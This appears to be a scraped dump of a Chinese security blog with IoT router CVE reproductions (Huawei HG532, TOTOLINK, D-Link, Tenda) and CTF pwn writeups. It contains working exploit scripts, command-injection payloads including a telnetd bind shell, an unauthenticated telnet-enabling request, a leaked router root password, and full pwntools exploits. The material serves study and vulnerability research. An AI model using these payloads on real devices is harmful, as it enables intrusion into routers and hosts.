成功进行了任意的命令执行接着来尝试第二种方法开启tddp服务以后 执行下列脚本 同时我们需要在宿主机上监听一下6666端口 nc -nvlp 6666 from socket import*from sys import* s = socket(AF_INET,SOCK_DGRAM)s.connect((&quot;192.168.6.3&quot;,1040)) payload = b&quot;\\x01\\x31&quot; #版本号和类型payload = payload.ljust(12,b&#x27;\\x00&#x27;) #填充垃圾数据payload += b&quot;/payload;aaa&quot;s.sendall(payload) 使其执行payload文件中的指令随后就可以在6666端口中接收到了id的回显 总结通过本次复现 第一次接触到了协议洞 相比常规的命令执行 协议洞需要先了解清楚协议的数据包构成 才能看懂代码逻辑发掘漏洞的思路还是通过定位execve或者是system这类敏感函数 然后再朔源查看是否存在控制参数的可能性 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"CVE 2017-17215","slug":"cve-2017-17215","date":"2023-10-07T12:52:47.000Z","updated":"2023-10-07T13:20:20.000Z","comments":true,"path":"2023/10/07/cve-2017-17215/","link":"","permalink":"http://example.com/2023/10/07/cve-2017-17215/","excerpt":"","text":"前言华为HG532部分定制版本存在远程代码执行漏洞 经过身份验证的攻击者可以向端口 37215 发送恶意数据包以发起攻击 成功利用可能导致远程执行任意代码固件下载地址: https://archive.org/download/RouterHG532e/router%20HG532e.rar 环境搭建readelf分析出来是mips32位大端序qemu启动 #/bin/shsudo tunctl -t top0 -u rootsudo ifconfig top0 192.168.6.2sudo qemu-system-mips -M malta -kernel ./mips_kernel/vmlinux-2.6.32-5-4kc-malta -hda ./mips_kernel/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic 接着配置系统模拟的eth0接口为192.168.6.xx随后利用scp上传一下提取出来的squashfs-root文件夹接着需要再开一个终端 ssh连接一下这里是因为&#x2F;bin&#x2F;mic文件的执行过程中会造成eth0接口的静态ip发生变化 所以需要我们利用ssh启动服务 随后在原本的会话中重新配置eth0接口的地址挂载一下相关服务 mount -o bind /dev ./squashfs-root/dev mount -t proc /proc ./squashfs-root/proc/ 开启ssh连接 ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.6.3 启动服务 chroot ./squashfs-root/ sh./bin/upnp./bin/mic 然后就会卡在这里 返回到qemu启动的那个会话 重新配置一下eth0接口就行了 漏洞分析根据官方的漏洞报告 我们可以得知漏洞出现的路径为&#x2F;ctrlt&#x2F;DeviceUpgrade_1 并且出现任意命令执行的参数为NewStatusURL和NewDownloadURL From looking into the UPnP description of the device, it can be seen that it supports a service type named `DeviceUpgrade`. This service is supposedly carrying out a firmware upgrade action by sending a request to “/ctrlt/DeviceUpgrade_1” (referred to as controlURL ) and is carried out with two elements named `NewStatusURL` and `NewDownloadURL`. 利用grep指令可以定位到DeviceUpgrade字符串位于upnp文件中有出现利用NewDownloadURL定位到目标函数 发现直接通过sprintf传参给了system函数 int __fastcall sub_40749C(int a1)&#123; int v2; // $s1 const char *v4; // [sp+20h] [-40Ch] BYREF const char *v5; // [sp+24h] [-408h] BYREF char v6[1028]; // [sp+28h] [-404h] BYREF v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewDownloadURL&quot;, 0, &amp;v4); if ( !v2 ) &#123; if ( v4 ) &#123; v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewStatusURL&quot;, 0, &amp;v5); if ( !v2 ) &#123; if ( v5 ) &#123; snprintf(v6, 1024, &quot;upg -g -U %s -t &#x27;1 Firmware Upgrade Image&#x27; -c upnp -r %s -d -b&quot;, v4, v5); system(v6); &#125; &#125; &#125; &#125; return v2;&#125; 这里有一个疑惑的点 虽然官方的报告说&#x2F;ctrlt&#x2F;DeviceUpgrade_1是负责固件的更新 但是不管是直接访问 还是抓包固件更新的按钮 我都没有得到访问该路径的包所以只能直接用网上的exp了 import requestsheaders = &#123; &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;&#125; data = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt; &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt; &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt; &lt;NewStatusURL&gt;;mkdir /bin/hell;&lt;/NewStatusURL&gt; &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt; &lt;/u:Upgrade&gt; &lt;/s:Body&gt;&lt;/s:Envelope&gt;&#x27;&#x27;&#x27;requests.post(&#x27;http://192.168.6.3:37215/ctrlt/DeviceUpgrade_1&#x27;,headers=headers,data=data) 如果成功执行 那么就会新建一个&#x2F;bin&#x2F;hell文件夹 思路总结不难看出 漏洞的核心点就在于system函数的参数没有得到限制 如果在实际的漏洞挖掘中应该遍历涉及到system函数的地方 然后看参数是否可控 可控的话参数是否进行了过滤如果可以利用 那么就朔源如何访问到这一函数 随后编写exp if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"TOTOLINK-A810R分析","slug":"totolink-a810r分析","date":"2023-09-25T02:25:35.000Z","updated":"2023-09-26T13:39:50.000Z","comments":true,"path":"2023/09/25/totolink-a810r分析/","link":"","permalink":"http://example.com/2023/09/25/totolink-a810r%E5%88%86%E6%9E%90/","excerpt":"","text":"前言偶然间看到了一个cve 是totolink的其他型号 随后发现我手上的这个貌似也存在这个漏洞 于是记录一下自己发掘的过程设备型号:TOTOLINK A810R固件版本: V5.9c.4573_B20191019下载地址: https://totolink.tw/support_view/A810R 环境搭建binwalk提取出文件系统后 老规矩还是来看一下架构随后就是qemu系统模拟 #/bin/shsudo tunctl -t top0 -u rootsudo ifconfig top0 192.168.6.2sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic 然后上传文件系统 chroot以及启动服务 scp -oHostKeyAlgorithms=+ssh-dss 1.zip root@192.168.6.3:/root/chroot ./squashfs-root /bin/sh./bin/lighttpd -f lighttp/lighttpd.conf -m lighttp/lib/ 但是由于totolink的管理界面 常规的浏览器是不支持的 需要ie浏览器但是linux安装ie浏览器过于麻烦 所以我直接闲鱼花30买了个真机用来复现 分析首先使用firmwalker来看一下文件系统中有什么可以利用的地方 ./firmwalker.sh ../iot/_TOTOLINK_A810R_V5.9c.4573_B20191019.web.extracted/squashfs-root ./firmwalker.txt 可以看到 存在着telnet服务 我们访问一下这个网页 看看有什么功能访问后直接跳转到了登录界面由于这里我们已经知道了用户密码 所以先登录进去可以看到就是一个功能简单的 设置是否开启telnet服务的页面这里直接使用burp来看一下按下apply按钮后发送的包 POST /cgi-bin/cstecgi.cgi HTTP/1.1Host: 192.168.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 60Origin: http://192.168.0.1Connection: keep-aliveReferer: http://192.168.0.1/telnet.asp?timestamp=1695703177052Cookie: SESSION_ID=2:1571586185:2&#123;&quot;telnet_enabled&quot;:&quot;1&quot;,&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;&#125; 向cstecgi.cgi进行了一个post请求包含了一个json表单 一个有两个参数 telnet_enabled和topicurl前者应该是用来控制是否开启telnet服务 而后者应该是用来决定处理方式因为利用浏览器的开发者工具 可以捕捉到一个包的参数为 “topicurl”:”setting&#x2F;getTelnetCfg”同时我们观察一下包的内容 可以发现其实对于是否登录并没有进行检测我们凭借这个poc就可以做到越权开启telnet服务扫描端口发现开在了23尝试nc连接发现需要账号密码而我们最开始使用firmwalker是扫描到了密码的打开看看这三个文件 发现是空的 不过紧邻着etc&#x2F;shadow的shadow.example存放着root用户的md5加密后的密码 root:$1$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:16090:0:99999:7:::nobody:*:0:0:99999:7::: 解密后发现是cs2012随后成功连接上路由器 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"CVE-2022-26258","slug":"CVE-2022-26258","date":"2023-09-23T07:21:25.000Z","updated":"2023-09-23T15:29:38.000Z","comments":true,"path":"2023/09/23/CVE-2022-26258/","link":"","permalink":"http://example.com/2023/09/23/CVE-2022-26258/","excerpt":"","text":"前言设备型号:D-Link DIR-820L固件下载地址:http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663 环境搭建直接直接选择使用Firmae进行模拟 sudo ./run.sh -r DIR ./DIR820LA1_FW105B03.bin 第一次使用Firmae可能需要等的比较久 我等了二十分钟左右出现下图中的样子就是启动成功了 漏洞分析根据提供的描述 可以得知漏洞出现在lan.asp中的device_name D-Link DIR-820L 1.05B03 was discovered to contain a remote command execution (RCE) vulnerability via the Device Name parameter in /lan.asp. 可以看到这个参数拼接到了paremStr中 作为copyDataToDataModelFormat函数的返回值朔源一下这个函数 推测出来请求的目标网址应该是get_set.ccp在squashfs-root文件夹中查询一下这个字符串没有找到这个文件名 应该是放到了后端处理 但是出现了四个使用到的二进制文件这里复制了这篇文章的描述: https://www.wangan.com/p/11v772975e2a5820 ◆bin/smbd 程序是 Samba 服务器的一部分，它允许路由器用户与 Windows 客户端共享文件和打印机。Samba 服务器是一个开源软件，它实现了 SMB/CIFS 协议，这是 Windows 操作系统使用的文件和打印机共享协议。bin/smbd 程序是 Samba 服务器的核心组件之一，它提供了文件和打印机共享的功能。◆bin/flash 程序允许用户升级路由器固件，以获取最新的功能和安全补丁。它还可以用于还原路由器的出厂设置，以便在出现问题时恢复路由器的正常运行。◆sbin/ncc2 程序主要用于配置路由器的网络设置和管理路由器的各种功能。通过 ncc2 程序，用户可以轻松地设置无线网络、防火墙、端口转发等功能，使路由器的使用更加便捷和高效。◆lib/libapmib.so 是 D-Link 路由器系统中的一个库文件，它包含了许多重要的 API 和函数，用于实现路由器的各种功能。用户可以通过调用这些 API 和函数来访问和配置路由器的网络设置、无线网络、防火墙、端口转发等功能。 所以这里我们选择ncc2这个程序 ida打开调用了hasInjectionString函数来判断是否存在注入字符串 这里需要查找一下过滤了哪些内容查找一下这个函数是在哪个动态库声明的最后成功找到了过滤的字符串 漏洞利用直接在管理界面修改device_name 随后点击保存 利用burp抓包可以看到修改的应该是这个参数 这里选择使用telnetd来创建一个远程会话连接 %0atelnetd -l /bin/sh -p 7080 -b 0.0.0.0%0a %0a用来绕过字符判断在7080端口建立一个&#x2F;bin&#x2F;sh的会话 等下直接nc这个端口就行了可惜我自己试了半天都没有复现成功 不过学习个思路就行了 总结如果要换我来挖掘漏洞的话 我认为应该是先批量查找调用了system函数的二进制文件 找到ncc2以后 再根据其拼接参数的来源去进一步找到device_name if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"cve-2018-5767","slug":"cve-2018-5767","date":"2023-09-15T03:03:19.000Z","updated":"2023-09-17T07:45:20.000Z","comments":true,"path":"2023/09/15/cve-2018-5767/","link":"","permalink":"http://example.com/2023/09/15/cve-2018-5767/","excerpt":"","text":"前言一款arm架构的路由器 主要的漏洞位于httpd中 cookie可以产生栈溢出 同时httpd开启的保护很少 比较适合新手用于arm架构的学习固件下载地址 https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1 环境模拟使用binwalk提取出固件的文件系统随后使用readelf查看一下固件的架构可以看到是32位的ARM架构接下来如果我们直接使用qemu-arm-static来启动httpd的话 会提示缺失库文件我们需要把qemu-arm-static的文件拷贝到当前目录 随后利用chroot将当前目录作为根目录 随后再重新启动 sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*cp /usr/bin/qemu-arm-static .sudo chroot ./ ./qemu-arm-static ./bin/httpd 但是你会发现此时程序卡在了这里先利用ida打开httpd 在字符串中搜索Welcome to 很快就定位了具体的位置可以看到对于v18的值进行了检查 如果小于等于0就陷入死循环将断点打在这个puts函数 我们看看v18的值是怎么赋值的 sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd gdb-multiarch ./bin/httpdtarget remote:1234b *0x2CF7Cc 可以看到此时的死循环和R3寄存器的值有关我们需要利用keypatch更改mvn这一条指令 使得r3的值大于0后可以绕过死循环但是可以看到此时虽然跳过了while的死循环 但是程序输出错误后就直接结束了还是老办法 定位到对应的字符串代码审计可以发现是这个if判断的锅我们需要进入这个if分支 才能正常使用程序则使得r3不为0即可随后又迎来了一个问题 可以看到虽然此时httpd已经成功启动 但是其获取到的ip地址明显不对 所以我们需要一个网桥接口来使得可以正常获取ip地址 sudo apt install uml-utilities bridge-utilssudo brctl addbr br0sudo ifconfig br0 upsudo ifconfig br0 192.168.xx.xx 随后我们再次运行httpd程序 可以发现成功获取到了ip地址暂时挂起这个进程 我们ping这个地址如果可以ping通就成功了但是还是发现无法正常访问网页 cp -rf ./webroot_ro/* ./webroot/` 把目录复制一下就行了 原理暂时还没搞懂这个师傅的文章看到的 https://cn-sec.com/archives/1727127.html 漏洞分析通过官方给出的分析https://fidusinfosec.com/remote-code-execution-cve-2018-5767/可以知道漏洞点位于R7WebsSecurityHandler函数中调用了sscanf函数把cookie中的password参数传入到了栈上 而httpd文件就开启了一个NX所以可以进行一个栈溢出的rop链利用看其他师傅是可以使用python脚本来发送请求的 但是不知道为啥我不行 所以这里采用bp来发包 （第二天补的这句话 发现是我的终端加了http和https的代理随后可以看到程序终止了 报段错误于是使用gdb-multiarch来进行动态调试 寻找触发段错误的指令 sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpdgdb-multiarch ./bin/httpdtarget remote:1234c 可以看到程序卡在了这里 由于r3寄存器被我们填入的垃圾数据覆盖而ldrb需要访问r3寄存器存储的内存地址中的数据 所以这里产生了非法的内存访问 从而导致了段错误通过backtrace指令 可以看到此指令是由0x2c5cc触发的 在ida中寻找一下在if分支中有一个函数涉及到了该地址所以我们要做的就是跳过if分支 这样才可以执行到我们控制的rop链绕过if分支的条件则是在’.’后跟上这些后缀名随后就是简单的栈溢出 直接打system就行了但是 由于我的vmmap不知道为啥获取不到对应的libc地址所以复现失败 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"Sictf_round2出题小记","slug":"Sictf-round2出题小记","date":"2023-09-11T04:43:02.000Z","updated":"2023-09-14T17:21:12.000Z","comments":true,"path":"2023/09/11/Sictf-round2出题小记/","link":"","permalink":"http://example.com/2023/09/11/Sictf-round2%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/","excerpt":"","text":"stack被非预期打穿了呜呜呜 应该清空一下栈的内容 或者加个内联汇编修改一下rdx寄存器的值 原本的做法是劫持rbp寄存器 修改rsi寄存器 随后就可以利用write函数泄露bss段上的libc import jsonimport requestsfrom pwn import *from ctypes import *binary = &quot;./pwn&quot;libc = ELF(&quot;./glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;)elf = ELF(binary)context.log_level = &#x27;debug&#x27;context.arch = &quot;amd64&quot;#context.arch = &quot;i386&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io = process(binary)#io = remote(&quot;192.168.0.104&quot;,32770)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Hello!!!&quot;)leak_addr = 0x404040write_addr = 0x4011E2bss_addr = elf.bss(0xa00)ptr_addr = 0x4011F1payload = cyclic(0x20)+p64(leak_addr+0x20+0x20)+p64(ptr_addr)# gdb.attach(io,&#x27;b *0x4011FE&#x27;)io.send(payload)# pause()payload = p64(bss_addr)+p64(write_addr)+cyclic(0x10)+p64(leak_addr+0x20)+p64(ptr_addr)io.send(payload)# pause()io.send(p8(0x80))# pause()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x21a780success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))ret_addr = 0x000000000040101apayload = cyclic(0x28)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)# gdb.attach(io,&#x27;b *0x4011FE&#x27;)io.send(payload)io.interactive() heaphouse of orange 不过对泄露堆地址的步骤改了改 没开PIE 这样可以用unsortedbin attack往存放堆块指针的地址写入堆地址 就可以泄露堆地址了 然后要明白unsortedbin attack为什么使用过一次后 再次进行堆块操作就会报错 是因为破坏了main_arena以及fd bk域 修复一下就可以再次进行unsortedbin attack了 随后就是house of orange的部分了 from pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;210.44.151.51&quot;,10202)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()def add(size,payload): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;Size :&quot;) io.sendline(str(size)) io.recvuntil(&quot;Content :&quot;) io.send(payload)def edit(index,size,payload): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index)) io.recvuntil(&quot;Size :&quot;) io.sendline(str(size)) io.recvuntil(&quot;Content :&quot;) io.send(payload)def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index))add(0x30,b&#x27;aaaa&#x27;)#0payload = cyclic(0x38)+p64(0xfc1)edit(0,len(payload),payload)add(0x1000,b&#x27;aaaa&#x27;)#1add(0x40,b&#x27;1&#x27;)#2show(2)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x3c5131success(&quot;libc_addr :&quot;+hex(libc_addr))payload = cyclic(0x48)+p64(0xf51)+p64(0)+p64(0x4040E0+0x40)edit(2,len(payload),payload)add(0xf40,b&#x27;aaaa&#x27;)#3show(10)io.recv()heap_addr = u64(io.recv(4).ljust(8,b&#x27;\\x00&#x27;))-0x22010success(&quot;heap_addr :&quot;+hex(heap_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]payload = p64(heap_addr+0x22010)+p64(heap_addr+0x90)*3edit(10,len(payload),payload)main_arena = libc_addr + 0x3c4b20+88payload = cyclic(0x48)+p64(0xf51)+p64(main_arena)*2edit(2,len(payload),payload)add(0x30,b&#x27;aaaa&#x27;)#4IO_list_all = libc_addr + libc.sym[&#x27;_IO_list_all&#x27;]payload = cyclic(0x30) #填充到old top chunkfake_file = b&#x27;/bin/sh\\x00&#x27;+p64(0x60) #覆盖size 使其释放到smallbin 0x60链表fake_file += p64(0)+p64(IO_list_all-0x10) #伪造bk域fake_file += p64(0)+p64(1) #布局io_write_ptr和io_write_basefake_file = fake_file.ljust(0xc0,b&#x27;\\x00&#x27;) #填充偏移payload += fake_file + p64(0)*3+p64(heap_addr+0x1a8)+p64(0)*2+p64(system_addr) #伪造vtable结构体edit(4,len(payload),payload)io.recvuntil(&quot;&gt;&quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;Size :&quot;)io.sendline(str(0x30))io.interactive()# debug() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"ToToLink-X5000R登录绕过","slug":"ToToLink-X5000R登录绕过","date":"2023-08-15T10:26:41.000Z","updated":"2023-09-14T17:21:04.000Z","comments":true,"path":"2023/08/15/ToToLink-X5000R登录绕过/","link":"","permalink":"http://example.com/2023/08/15/ToToLink-X5000R%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87/","excerpt":"","text":"前言跟着看雪上的这位师傅复现的 https://www.kanxue.com/chm.htm?id=17830 好文章 学到了面对一个路由器时的分析思路 模拟固件下载地址http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&amp;id=65 mipsel架构 模拟脚本 #/bin/shsudo tunctl -t top0 -u rootsudo ifconfig top0 192.168.6.2sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic 模拟起来后 进入其中配置eth0网络接口与top0位于同一c段 随后打包squashfs-root文件夹 通过scp上传到模拟系统中 以squashfs-root文件夹为根目录 chroot ./squashfs-root/ /bin/sh 随后启动路由器服务 ./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf 会因为找不到文件而报错 直接在对应目录下创建一个空文件就可以了 成功启动服务 固件分析首先我们要清楚 我们要从哪个方向来分析这个路由器 这一点是至关重要的 不能漫无目的 我们选择针对登录这一点来分析 首先试着随便输入密码 并且通过抓包来查看登录检测涉及到了哪些文件 可以看到 密码的发送是通过这个包来进行的 同时你可以注意到状态是302 这意味着服务器返回了重定向响应 来看一下跳转的地址是什么 http://192.168.6.1/formLoginAuth.htm？authCode=0&amp;userName=&amp;goURL=phone/login.html&amp;action=login&amp;flag=1 有着比较多的参数 应该是用来判断用户的密码是否正确 我们找到这个包对应的cgi文件 搜索username字符串 尝试找到对应的代码 发现了sub_42A2D0函数 其功能似乎是根据其他参数来决定重定向的网址 来看下面的代码 根据v9来判断重定向的网址 这里猜测应该是flag这个参数 http://192.168.6.1/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=phone/login.html&amp;action=login&amp;flag=ie8 通过单独修改flag为ie8 最后成功重定向到了login_ie.html 证实了猜想 但是好像没有什么软用 接下来想的是为www目录下找到formLoginAuth.htm这个网址 但是好像没有 那么就去lighttpd这个文件来看看 可以看到 根据不同的网址来进入不同的函数 我们来跟进到form_login函数中 if ( v8 ) &#123; fbss = 0; do &#123; v13 = time(0); if ( !ws_get_cookie(a1, &quot;SESSION_ID&quot;, v16, 0) &amp;&amp; form_get_idx_by_sessionid(&amp;fl_sess, v13, v16) != -1 ) &#123; sprintf(a2, &quot;http://%s/%s?timestamp=%ld&quot;, v23, v20, v13); return 1; &#125; sprintf(v15, &quot;%ld:%d&quot;, v13, 2); sprintf(v19, &quot;%d:%s&quot;, 2, v15); &#125; while ( form_get_idx_by_sessionid(&amp;fl_sess, v13, v19) != -1 ); if ( !v6 ) v6 = &quot;&quot;; if ( form_add_session(&amp;fl_sess, &amp;fl_sess_bak, -1, v17, v6, v19, 2, v13) ) &#123; ws_set_cookie(a3, &quot;SESSION_ID&quot;, v19, 0, &quot;/&quot;, 0); sprintf(a2, &quot;http://%s/%s?timestamp=%ld&quot;, v23, v20, v13); return 0; &#125; ws_clear_cookie(a3, &quot;SESSION_ID&quot;, &quot;/&quot;); fbss = 4; if ( !strcmp(&amp;v14, &quot;ie8&quot;) ) &#123; sprintf(a2, &quot;http://%s%s&quot;, v23, &quot;/login_ie.html&quot;); &#125; else &#123; if ( atoi(&amp;v14) == 1 ) &#123; sprintf(a2, &quot;http://%s%s%s&quot;, v23, &quot;/phone&quot;, &quot;/login.html&quot;); return 0; &#125; sprintf(a2, &quot;http://%s%s&quot;, v23, &quot;/login.html&quot;); &#125; return 0; &#125; 这里可以看到对于v8的值进行了判断 如果不为0则进入if分支 可以看到对于a2进行了操作 而我们看到下面 a2应该是重定向的地址 那么v8的值怎么来的呢 可以看到应该是跟authcode的参数有关系 那么我们将authcode修改为1后试试 结果发现还是跳转回到login.html页面 但是参数确实多了个timestamp 这里应该是由于我们重定向导致的 但是将flag删除掉 也没有办法 因为会进入最后的else分支 默认重定向到&#x2F;login.html 但是我们仔细观察一下参数 还是有一个叫做goURL的 我们把这个参数删除掉后 成功绕过了登录 进入了后台 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[]},{"title":"CVE-2020-24581","slug":"CVE-2020-24581","date":"2023-08-09T11:51:32.000Z","updated":"2023-09-14T17:18:54.000Z","comments":true,"path":"2023/08/09/CVE-2020-24581/","link":"","permalink":"http://example.com/2023/08/09/CVE-2020-24581/","excerpt":"","text":"前言参照资料https://www.anquanke.com/post/id/229323#h3-5 比较简单的一个CVE 且不需要模拟路由器环境 适合第一次接触iot的萌新(就比如我 同时由于我的网络基础知识薄弱 有些地方也是网络上查资料的 可能存在错误 漏洞路由器型号:D-Link DSL-2888A 漏洞编号: CVE-2020-24581 fofa搜索关键词: body&#x3D;DSL-2888A 漏洞影响版本: AU_2.31_V1.1.47ae55之前的版本 固件下载: https://www.dlink.com.sg/dsl-2888a/ 逻辑分析首先要清楚 漏洞产生的原因是因为execute_cmd.cgi文件存在任意的参数执行 为了捋清楚漏洞的本质 我们要定位到以下两个重点 1.如何执行到execute_cmd.cgi文件 2.如何赋值execute_cmd.cgi的参数 如何执行到execute_cmd.cgi文件&#x2F;etc&#x2F;rc.d&#x2F;rcS是Linux系统中负责系统初始化以及启动相关任务的脚本 本次漏洞是由web服务触发的 所以我们需要跟进到路由器负责web服务的二进制文件 通过&#x2F;etc&#x2F;rc.d&#x2F;rcS脚本 可以定位到是dhttpd if [ -e &quot;/usr/sbin/onetouch&quot; ]; thendxml -n dbros -t &amp;sleep 1dxmlc -l /usr/script/onetouch/dlink.xmlsleep 1/usr/script/onetouch/sync_device.sh/usr/script/onetouch/sync_wan.sh/usr/script/onetouch/sync_wlan.sh/usr/script/onetouch/sync_wlan5g.shdhttpd &amp;killall onetouchonetouch &amp;fi 通过find命令 可以定位到位于&#x2F;usr&#x2F;sbin&#x2F;dhttpd目录发现是32位的ARM架构的文件随后我们需要定位到dhttp文件中负责调用execute_cmd.cgi文件的函数先来搞明白cgi文件是什么 CGI (Common Gateway Interface) 文件是一种通用的网页编程技术 用于在Web服务器上执行可执行程序或脚本其存放在jffs2-root&#x2F;www&#x2F;cgi-bin&#x2F;目录下所以我们尝试在ida中搜索cgi-bin字符串 就可以跟着定位到sub_9C4C函数该函数用来加载web和cgi组件我们可以进一步跟进到sub_BEA0函数这里进行调用cgi文件前的相关check和初始化在后面可以看到 需要相关的环境变量来启动cgi文件可以看到有REMOTE_USER的变量 说明可能需要随后调用了sub_BB5C函数执行cgi文件 如何赋值execute_cmd.cgi的参数#!/bin/sh. /usr/syscfg/api_log.shcmd=`echo $&#123;QUERY_STRING&#125; | cut -d = -f 3` cmd=`echo $&#123;cmd&#125; |tr &quot;%20&quot; &quot; &quot;` result=`$&#123;cmd&#125;` TGP_Log $&#123;TGP_LOG_WARNING&#125; &quot;cmd=$&#123;cmd&#125;, result=$&#123;result&#125;&quot;echo &quot;Content-type: text/html&quot;echo &quot;&quot;echo -n $&#123;result&#125; 通过分析其内容 可以看到cmd参数是根据QUERY_STRING环境变量的第三个字段来的 其分割符是‘&#x3D;’那么我们此时来遍历一下目录下的所有文件 看看QUERY_STRING环境变量的内容 import osdef search_files(directory, target_string): for root, dirs, files in os.walk(directory): for file in files: filepath = os.path.join(root, file) with open(filepath, &#x27;r&#x27;, errors=&#x27;ignore&#x27;) as f: line_number = 1 for line in f: if target_string.lower() in line.lower(): print(f&quot;Found in file: &#123;filepath&#125;, line: &#123;line_number&#125;, content: &#123;line&#125;&quot;) line_number += 1# 指定要搜索的目录和目标字符串search_directory = &#x27;/home/chen/iot/_DSL-2888A_AU_2.12_V1.1.47Z1-Image-all.bin.extracted/jffs2-root&#x27;target_string = &#x27;QUERYSTRING&#x27;# 调用函数进行批量搜索search_files(search_directory, target_string) 这里搜索QUERY_STRING没有找到有用的文件 所以去掉了_ 于是我们可以定位到ajax.js文件 通过观察POC我们可以知道 是通过GET请求 很快可以定位到对应的代码 get : function(_dataType) &#123; var _url = this.url; 